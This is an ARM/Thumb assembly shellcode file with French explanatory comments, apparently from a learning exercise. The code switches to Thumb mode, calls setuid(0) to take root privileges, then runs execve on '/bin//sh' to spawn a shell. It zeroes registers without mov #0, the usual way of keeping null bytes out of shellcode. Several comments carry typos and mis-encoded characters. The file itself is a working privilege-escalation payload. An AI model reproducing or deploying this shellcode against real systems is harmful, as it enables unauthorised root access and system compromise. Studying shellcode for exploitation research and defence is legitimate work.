text
.global main
.arm

main:
	add r6, pc, #1
	bx r6

.thumb
	mov r7, #0x17 ;syscall accordÃde privilege (ici on veut root)
	sub r1,r1,r1 ; Voir plus bas
	mov r0,r1 ;0 (num de permission) est le privilege root 
	svc 1 
	mov r0,pc ; On prend l'addresse de la prohcaine instruction
	add r0,#8 ; On ajoute 8 car 4(4instruction avant la commande a lance)
		  ; multiplier par  2(2 octet car mode thumb)
		  
	mov r7,#0x0b ;syscall execnv->permet executer une commande
	sub r1,r1,r1 ;Pas d'argument, on favorise cette methode a mov, #0 car
	sub r2,r2,r2 ;mov n'assure pas la valeur du registre a 0
	svc 1
.asciz "/bin//sh" ;addresse specifier dans R0 avant le syscall 0x0b
